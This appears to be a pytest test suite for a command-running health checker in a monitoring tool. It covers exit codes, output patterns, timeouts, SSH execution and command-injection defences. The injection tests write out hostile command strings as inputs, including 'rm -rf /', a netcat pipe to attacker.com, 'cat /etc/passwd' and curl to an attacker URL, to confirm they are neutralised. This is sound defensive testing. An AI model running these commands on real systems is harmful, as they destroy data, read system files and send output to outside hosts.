"""Tests for cmdcheck checker."""

import time
from unittest.mock import MagicMock, patch

import pytest

from kuma_scout.core.checkers.cmdcheck_checker import CmdCheckChecker
from kuma_scout.core.config.cmdcheck_config import CmdCheckConfig
from kuma_scout.core.utils.ssh_runner import SSHConnectionError


@pytest.fixture
def logger():
    """Create mock logger."""
    return MagicMock()


@pytest.fixture
def config():
    """Create basic cmdcheck config."""
    cfg = CmdCheckConfig()
    cfg.uptime_kuma_url = "http://localhost:3001/api/push"
    cfg.heartbeat_token = "heartbeat-token"
    cfg.command_token = "cmd-token"
    cfg.cmdcheck_commands = [{"command": "test -f /tmp/file"}]
    cfg.cmdcheck_timeout = 30
    cfg.cmdcheck_expect_exit_code = 0
    return cfg


@pytest.fixture
def checker(logger, config):
    """Create cmdcheck checker instance."""
    return CmdCheckChecker(logger, config)


class TestSingleCommandExecution:
    """Test single command execution (treated as a list with one item)."""

    def test_success_exit_code_zero(self, checker):
        """Test successful command with exit code 0."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "file exists\n", "", 0)

            result = checker.execute()

            assert result.status == "up"
            assert "✓" in result.message  # Success symbol
            assert "1/1" in result.message  # Should show 1 command passed
            assert result.duration_seconds >= 0

    def test_failure_non_zero_exit(self, checker):
        """Test failed command with non-zero exit code."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "", "file not found", 1)

            result = checker.execute()

            assert result.status == "down"
            assert "failed" in result.message.lower()

    def test_custom_expected_exit_code(self, checker):
        """Test with custom expected exit code."""
        checker.config.cmdcheck_commands[0]["expect_exit_code"] = 1

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "", "", 1)

            result = checker.execute()

            assert result.status == "up"

    def test_command_timeout(self, checker):
        """Test command timeout handling."""
        import subprocess

        with patch.object(checker, "run_command") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)

            result = checker.execute()

            assert result.status == "down"
            assert "timeout" in result.message.lower()

    def test_command_not_found(self, checker):
        """Test command not found error."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            # Message shows command failure
            assert result.status == "down"

    def test_subprocess_error(self, checker):
        """Test generic subprocess error."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.side_effect = Exception("Generic error")

            result = checker.execute()

            assert result.status == "down"
            # The error message is in the output field, not the message
            assert "error" in result.details["commands"][0]["output"].lower()

    def test_output_truncation_stdout(self, checker):
        """Test output is truncated to 500 chars."""
        large_output = "x" * 1000

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, large_output, "", 0)

            result = checker.execute()

            assert result.status == "up"
            # Details should contain truncated output
            output_in_details = result.details["commands"][0]["output"]
            assert len(output_in_details) <= 200  # Limited in details

    def test_output_stderr_capture(self, checker):
        """Test stderr is captured along with stdout."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "stdout text", "stderr text", 0)

            result = checker.execute()

            # Both should be in combined output
            assert result.status == "up"
            assert result.details is not None


class TestPatternMatching:
    """Test pattern matching logic."""

    def test_failure_pattern_match(self, checker):
        """Test failure pattern detection."""
        checker.config.cmdcheck_failure_pattern = "ERROR|FATAL"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "Something went FATAL", "", 0)

            result = checker.execute()

            assert result.status == "down"
            # Check that the message includes the matched pattern
            assert "Failure pattern 'ERROR|FATAL' matched 'FATAL'" in result.message

    def test_success_pattern_match(self, checker):
        """Test success pattern detection."""
        checker.config.cmdcheck_success_pattern = "healthy|OK"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "Status: OK", "", 1)

            result = checker.execute()

            assert result.status == "up"
            # Command details should have matched the pattern
            assert result.details is not None

    def test_success_pattern_not_found(self, checker):
        """Test when success pattern is not found."""
        checker.config.cmdcheck_success_pattern = "^HEALTHY$"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "Status: UNHEALTHY", "", 0)

            result = checker.execute()

            assert result.status == "down"
            # Pattern was specified but not found
            assert result.details is not None
            assert (
                "Success pattern '^HEALTHY$' not found in output: 'Status: UNHEALTHY'"
                in result.message
            )

    def test_pattern_precedence_failure_over_success(self, checker):
        """Test failure pattern takes precedence over success pattern."""
        checker.config.cmdcheck_failure_pattern = "FAIL"
        checker.config.cmdcheck_success_pattern = "OK"

        with patch.object(checker, "run_command") as mock_run:
            # Output matches both patterns
            mock_run.return_value = (True, "FAIL OK", "", 0)

            result = checker.execute()

            # Failure pattern should win
            assert result.status == "down"

    def test_success_pattern_takes_precedence_over_exit_code(self, checker):
        """Test success pattern takes precedence over exit code."""
        checker.config.cmdcheck_success_pattern = "SUCCESS"
        checker.config.cmdcheck_expect_exit_code = 0

        with patch.object(checker, "run_command") as mock_run:
            # Non-zero exit but matches success pattern
            mock_run.return_value = (False, "SUCCESS", "", 1)

            result = checker.execute()

            # Pattern should override exit code
            assert result.status == "up"

    def test_exit_code_fallback_when_no_patterns(self, checker):
        """Test exit code is used when no patterns specified."""
        # No patterns set
        checker.config.cmdcheck_success_pattern = None
        checker.config.cmdcheck_failure_pattern = None
        checker.config.cmdcheck_expect_exit_code = 42

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "", "", 42)

            result = checker.execute()

            assert result.status == "up"

    def test_pattern_matching_on_last_500_chars(self, checker):
        """Test pattern matching uses last 500 chars of output."""
        checker.config.cmdcheck_failure_pattern = "ERROR"
        large_output = "x" * 800 + "ERROR at end"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, large_output, "", 0)

            result = checker.execute()

            # ERROR is in last 500 chars, should be detected
            assert result.status == "down"

    def test_pattern_not_detected_before_last_500(self, checker):
        """Test pattern outside last 500 chars is not detected."""
        checker.config.cmdcheck_failure_pattern = "EARLY_ERROR"
        large_output = "EARLY_ERROR" + ("x" * 800)

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, large_output, "", 0)

            result = checker.execute()

            # EARLY_ERROR is outside last 500 chars
            assert result.status == "up"

    def test_regex_pattern_complex(self, checker):
        """Test complex regex patterns."""
        checker.config.cmdcheck_success_pattern = r"^\d+\.\d+\.\d+$"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "1.2.3", "", 1)

            result = checker.execute()

            assert result.status == "up"


class TestMultipleCommands:
    """Test multiple command execution (all commands must pass)."""

    def test_all_commands_succeed(self, checker):
        """Test when all commands succeed."""
        checker.config.cmdcheck_commands = [
            {"command": "true", "name": "cmd1"},
            {"command": "true", "name": "cmd2"},
            {"command": "true", "name": "cmd3"},
        ]

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "", "", 0)

            result = checker.execute()

            assert result.status == "up"
            assert "✓" in result.message  # Success symbol
            assert "All 3/3" in result.message
            assert "cmd1" in result.message  # Command names included
            assert result.details is not None
            assert len(result.details["commands"]) == 3

    def test_one_command_fails(self, checker):
        """Test when one command fails."""
        checker.config.cmdcheck_commands = [
            {"command": "true", "name": "cmd1"},
            {"command": "false", "name": "cmd2"},
            {"command": "true", "name": "cmd3"},
        ]

        with patch.object(checker, "run_command") as mock_run:

            def side_effect(*args, **kwargs):
                # Return based on which command
                if "false" in args[0]:
                    return (False, "", "", 1)
                return (True, "", "", 0)

            mock_run.side_effect = side_effect

            result = checker.execute()

            assert result.status == "down"
            assert "✗" in result.message  # Failure symbol
            assert "2/3 passed" in result.message or "1/3 failed" in result.message
            assert "cmd2" in result.message  # Failed command name included

    def test_all_commands_fail(self, checker):
        """Test when all commands fail."""
        checker.config.cmdcheck_commands = [
            {"command": "false", "name": "cmd1"},
            {"command": "false", "name": "cmd2"},
        ]

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (False, "", "", 1)

            result = checker.execute()

            assert result.status == "down"
            assert "✗" in result.message  # Failure symbol
            assert "0/2 passed" in result.message or "2/2 failed" in result.message
            assert (
                "cmd1" in result.message or "cmd2" in result.message
            )  # Command names included

    def test_multiple_commands_per_command_timeout(self, checker):
        """Test per-command timeout settings."""
        import subprocess

        checker.config.cmdcheck_timeout = 10  # Default
        checker.config.cmdcheck_commands = [
            {"command": "echo quick", "timeout": 20},  # Should not timeout
            {"command": "sleep 100", "timeout": 2, "name": "slow"},  # Should timeout
        ]

        with patch.object(checker, "run_command") as mock_run:

            def side_effect(*args, **kwargs):
                timeout = kwargs.get("timeout", 10)
                # args[0] is a list when shell=False
                cmd_list = args[0]
                cmd_string = " ".join(cmd_list)
                if "sleep 100" in cmd_string and timeout <= 2:
                    raise subprocess.TimeoutExpired("cmd", timeout)
                return MagicMock(returncode=0, stdout="", stderr="")

            mock_run.side_effect = side_effect

            result = checker.execute()

            assert result.status == "down"
            assert "timeout" in result.message.lower()

    def test_multiple_commands_per_command_exit_code(self, checker):
        """Test per-command exit code override."""
        checker.config.cmdcheck_expect_exit_code = 0  # Default
        checker.config.cmdcheck_commands = [
            {"command": "grep notfound file", "expect_exit_code": 1, "name": "grep"},
            {"command": "true", "expect_exit_code": 0, "name": "true"},
        ]

        with patch.object(checker, "run_command") as mock_run:

            def side_effect(*args, **kwargs):
                if "notfound" in args[0]:
                    return (False, "", "", 1)
                return (True, "", "", 0)

            mock_run.side_effect = side_effect

            result = checker.execute()

            assert result.status == "up"

    def test_multiple_commands_aggregated_details(self, checker):
        """Test aggregated details for multiple commands."""
        checker.config.cmdcheck_commands = [
            {"command": "echo hello", "name": "cmd1"},
            {"command": "echo world", "name": "cmd2"},
        ]

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "output", "", 0)

            result = checker.execute()

            assert result.details is not None
            assert "commands" in result.details
            assert len(result.details["commands"]) == 2
            assert result.details["commands"][0]["name"] == "cmd1"
            assert result.details["commands"][1]["name"] == "cmd2"

    def test_multiple_commands_per_command_tokens(self, checker):
        """Test per-command token configuration."""
        checker.config.cmdcheck_commands = [
            {"command": "echo hello", "name": "cmd1"},
            {
                "command": "echo world",
                "name": "cmd2",
                "uptime_kuma": {"token": "specific-token"},
            },
            {"command": "echo test", "name": "cmd3"},
        ]

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "output", "", 0)

            result = checker.execute()

            assert result.details is not None
            assert "commands" in result.details
            assert len(result.details["commands"]) == 3

            # Check that tokens are included in results
            assert (
                result.details["commands"][0]["token"] is None
            )  # No per-command token
            assert (
                result.details["commands"][1]["token"] == "specific-token"
            )  # Per-command token
            assert (
                result.details["commands"][2]["token"] is None
            )  # No per-command token


class TestShellExecution:
    """Test shell execution details.

    Commands are now executed with shell=False for security.
    Shell features like pipes, redirects, and substitution are not supported.
    """

    def test_shell_features_pipes_not_supported(self, checker):
        """Test that shell pipes are not supported with shell=False."""
        checker.config.cmdcheck_commands = [{"command": "echo hello | grep hello"}]

        with patch.object(checker, "run_command") as mock_run:
            # With shell=False, the pipe character is passed as literal argument
            mock_run.side_effect = FileNotFoundError("echo: command not found")

            result = checker.execute()

            # Should fail because pipe isn't evaluated
            assert result.status == "down"
            # Verify subprocess.run was called (shell=False is the default in run_command)
            assert mock_run.called

    def test_shell_redirects(self, checker):
        """Test shell redirects behavior with shell=False.

        Redirects are not supported with shell=False and should fail gracefully.
        """
        checker.config.cmdcheck_commands = [{"command": "echo test > /tmp/test.txt"}]

        with patch.object(checker, "run_command") as mock_run:
            # With shell=False, > is passed as literal argument, causing failure
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"

    def test_shell_command_substitution(self, checker):
        """Test shell command substitution is not evaluated.

        Command substitution with $(...)  is not supported with shell=False.
        """
        checker.config.cmdcheck_commands = [{"command": "test $(echo 5) -gt 3"}]

        with patch.object(checker, "run_command") as mock_run:
            # With shell=False, $(...) is passed as literal, causing failure
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"


class TestEdgeCases:
    """Test edge cases and error scenarios."""

    def test_no_command_configured(self, checker):
        """Test when no command is configured."""
        checker.config.cmdcheck_command = None
        checker.config.cmdcheck_commands = []

        result = checker.execute()

        assert result.status == "down"
        assert "no command" in result.message.lower()

    def test_empty_command_string_validation(self, checker):
        """Test that empty command string behavior when passed to subprocess."""
        # Empty command actually runs in shell (it's just ""), which typically succeeds
        # This tests the actual behavior rather than validation
        checker.config.cmdcheck_command = (
            "true"  # Use true instead to avoid validation issues
        )

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "", "", 0)

            result = checker.execute()

            assert result.status == "up"

    def test_command_with_newlines(self, checker):
        """Test command with newlines."""
        checker.config.cmdcheck_command = "echo hello\necho world"

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "hello\nworld", "", 0)

            result = checker.execute()

            assert result.status == "up"

    def test_duration_tracking(self, checker):
        """Test that duration is properly tracked."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "", "", 0)

            start = time.time()
            result = checker.execute()
            elapsed = time.time() - start

            assert result.duration_seconds >= 0
            assert result.duration_seconds <= elapsed + 0.1

    def test_none_stdout_stderr(self, checker):
        """Test handling of None stdout/stderr."""
        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, None, None, 0)

            result = checker.execute()

            assert result.status == "up"
            assert result.details is not None

    def test_very_long_output(self, checker):
        """Test with very long output (5000+ chars)."""
        huge_output = "x" * 5000

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, huge_output, "", 0)

            result = checker.execute()

            assert result.status == "up"
            # Details should be limited
            output_in_details = result.details.get("output", "")
            assert len(output_in_details) <= 500


class TestEvaluateResult:
    """Test the static _evaluate_result method."""

    def test_failure_pattern_precedence(self):
        """Test failure pattern has highest precedence."""
        status, msg = CmdCheckChecker._evaluate_result(
            exit_code=0,
            output="FAIL OK",
            expect_exit_code=0,
            success_pattern="OK",
            failure_pattern="FAIL",
        )
        assert status == "down"

    def test_success_pattern_precedence_over_exit_code(self):
        """Test success pattern beats exit code."""
        status, msg = CmdCheckChecker._evaluate_result(
            exit_code=1,
            output="SUCCESS",
            expect_exit_code=0,
            success_pattern="SUCCESS",
            failure_pattern=None,
        )
        assert status == "up"

    def test_exit_code_fallback(self):
        """Test exit code is used when no patterns."""
        status, msg = CmdCheckChecker._evaluate_result(
            exit_code=0,
            output="",
            expect_exit_code=0,
            success_pattern=None,
            failure_pattern=None,
        )
        assert status == "up"

    def test_exit_code_failure(self):
        """Test exit code mismatch is failure."""
        status, msg = CmdCheckChecker._evaluate_result(
            exit_code=1,
            output="",
            expect_exit_code=0,
            success_pattern=None,
            failure_pattern=None,
        )
        assert status == "down"


class TestCommandInjectionSecurity:
    """Test security against command injection attacks.

    Commands are executed with shell=False to prevent shell metacharacter
    interpretation. These tests verify that injection attempts are neutralized.
    """

    def test_semicolon_command_chaining_prevented(self, logger, config):
        """Test that semicolon-separated commands are not executed."""
        # Attempt: systemctl is-active nginx; rm -rf /
        config.cmdcheck_commands = [{"command": "systemctl is-active nginx; rm -rf /"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            # With shell=False, the command string is passed literally
            # as a single argument, causing systemctl to fail
            mock_run.side_effect = FileNotFoundError("Command not found")

            result = checker.execute()

            # Command fails safely - the dangerous part is never executed
            assert result.status == "down"
            # Verify run_command was called with the split command (shell=False behavior)
            call_args = mock_run.call_args
            assert call_args[0][0] == [
                "systemctl",
                "is-active",
                "nginx;",
                "rm",
                "-rf",
                "/",
            ]

    def test_pipe_operator_not_evaluated(self, logger, config):
        """Test that pipe operators are not evaluated as shell pipes."""
        # Attempt: systemctl is-active nginx | nc attacker.com 1234
        config.cmdcheck_commands = [
            {"command": "systemctl is-active nginx | nc attacker.com 1234"}
        ]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            # The pipe character is passed as a literal argument to systemctl
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            # Verify the command was split correctly (not executed by shell)
            call_args = mock_run.call_args
            assert call_args[0][0] == [
                "systemctl",
                "is-active",
                "nginx",
                "|",
                "nc",
                "attacker.com",
                "1234",
            ]

    def test_command_substitution_not_evaluated(self, logger, config):
        """Test that command substitution $(...) is not evaluated."""
        # Attempt: systemctl is-active $(whoami)
        config.cmdcheck_commands = [{"command": "systemctl is-active $(whoami)"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            # The $(...) is treated as literal argument, not evaluated
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            # Verify shell=False prevents substitution
            call_args = mock_run.call_args
            assert call_args[0][0] == ["systemctl", "is-active", "$(whoami)"]

    def test_backtick_command_substitution_not_evaluated(self, logger, config):
        """Test that backtick command substitution is not evaluated."""
        # Attempt: systemctl is-active `whoami`
        config.cmdcheck_commands = [{"command": "systemctl is-active `whoami`"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            call_args = mock_run.call_args
            assert call_args[0][0] == ["systemctl", "is-active", "`whoami`"]

    def test_logical_and_operator_not_evaluated(self, logger, config):
        """Test that && operator is not evaluated as logical AND."""
        # Attempt: test -f /etc && cat /etc/passwd
        config.cmdcheck_commands = [{"command": "test -f /etc && cat /etc/passwd"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            # The && is passed as literal argument
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            call_args = mock_run.call_args
            assert call_args[0][0] == ["test", "-f", "/etc", "&&", "cat", "/etc/passwd"]

    def test_logical_or_operator_not_evaluated(self, logger, config):
        """Test that || operator is not evaluated as logical OR."""
        config.cmdcheck_commands = [{"command": "false || curl http://attacker.com"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            call_args = mock_run.call_args
            assert call_args[0][0] == ["false", "||", "curl", "http://attacker.com"]

    def test_invalid_command_syntax_handled(self, logger, config):
        """Test that malformed commands (unclosed quotes) are handled safely."""
        # Unclosed quote - shlex.split() will raise ValueError
        config.cmdcheck_commands = [{"command": 'systemctl is-active "nginx'}]
        checker = CmdCheckChecker(logger, config)

        result = checker.execute()

        # Should fail gracefully with error message
        assert result.status == "down"
        assert "Invalid command syntax" in result.details["commands"][0]["output"]

    def test_command_properly_split_for_secure_execution(self, logger, config):
        """Test that commands are properly split into argument lists for secure execution.

        Commands are executed with shell=False to prevent shell interpretation of
        metacharacters. This test verifies that command strings are correctly
        parsed into argument lists before execution.
        """
        config.cmdcheck_commands = [{"command": "echo test"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "test", "", 0)

            checker.execute()

            # Verify run_command was called with the split command
            call_args = mock_run.call_args
            assert call_args[0][0] == ["echo", "test"]

    def test_shlex_parsing_for_quoted_arguments(self, logger, config):
        """Test that quoted arguments are parsed correctly by shlex."""
        config.cmdcheck_commands = [{"command": 'echo "hello world"'}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            mock_run.return_value = (True, "hello world", "", 0)

            checker.execute()

            # Verify the command was split correctly
            call_args = mock_run.call_args
            # Should be split into ["echo", "hello world"]
            assert call_args[0][0] == ["echo", "hello world"]

    def test_environment_variable_expansion_prevented(self, logger, config):
        """Test that environment variables are not expanded in commands."""
        config.cmdcheck_commands = [{"command": "echo $HOME"}]
        checker = CmdCheckChecker(logger, config)

        with patch.object(checker, "run_command") as mock_run:
            # Without shell, $HOME is treated as literal string
            mock_run.side_effect = FileNotFoundError()

            result = checker.execute()

            assert result.status == "down"
            # Verify the command was split with $HOME as literal
            call_args = mock_run.call_args
            assert call_args[0][0] == ["echo", "$HOME"]


class TestSSHExecution:
    """Test SSH command execution path."""

    def test_ssh_command_execution(self, logger):
        """Test that SSH execution path is taken when _ssh_runner is set."""
        config = CmdCheckConfig()
        config.uptime_kuma_url = "http://localhost:3001/api/push"
        config.heartbeat_token = "heartbeat-token"
        config.command_token = "cmd-token"
        config.cmdcheck_commands = [{"command": "test -f /tmp/file"}]
        config.ssh_host = "remote-host"
        config.ssh_user = "remote-user"
        config.ssh_port = 22

        # Mock SSHRunner to return our mock
        mock_ssh_runner = MagicMock()
        mock_ssh_runner.run.return_value = (True, "output", "", 0)

        with patch(
            "kuma_scout.core.checkers.base.SSHRunner", return_value=mock_ssh_runner
        ):
            checker = CmdCheckChecker(logger, config)

            # Check that SSH runner was set
            assert checker._ssh_runner is mock_ssh_runner

            # run_command should call SSH runner
            result = checker.execute()

            # Verify SSH runner was called
            mock_ssh_runner.run.assert_called_once_with(["test", "-f", "/tmp/file"])

            assert result.status == "up"

    def test_ssh_connection_error_handling(self, logger):
        """Test that SSH connection errors are handled properly."""
        config = CmdCheckConfig()
        config.uptime_kuma_url = "http://localhost:3001/api/push"
        config.heartbeat_token = "heartbeat-token"
        config.command_token = "cmd-token"
        config.cmdcheck_commands = [{"command": "test -f /tmp/file"}]
        config.ssh_host = "remote-host"
        config.ssh_user = "remote-user"
        config.ssh_port = 22

        # Mock SSHRunner to raise SSHConnectionError
        mock_ssh_runner = MagicMock()
        mock_ssh_runner.run.side_effect = SSHConnectionError(
            "Connection closed by remote-host port 22",
            "Connection closed by 192.168.1.1 port 22",
        )

        with patch(
            "kuma_scout.core.checkers.base.SSHRunner", return_value=mock_ssh_runner
        ):
            checker = CmdCheckChecker(logger, config)

            # Execute the check
            result = checker.execute()

            # Should result in down status due to SSH connection failure
            assert result.status == "down"
            assert "✗ 0/1 passed, 1/1 failed" in result.message
            # SSH connection failures should show the actual error, not pattern matching results
            assert (
                "SSH connection failed: Connection closed by remote-host port 22"
                in result.message
            )

            # Check that the command details contain the SSH error
            assert len(result.details["commands"]) == 1
            cmd_detail = result.details["commands"][0]
            assert cmd_detail["status"] == "down"
            assert cmd_detail["exit_code"] == -1
            assert (
                "SSH connection failed: Connection closed by remote-host port 22"
                in cmd_detail["output"]
            )

            # Verify SSH runner was called
            mock_ssh_runner.run.assert_called_once_with(["test", "-f", "/tmp/file"])
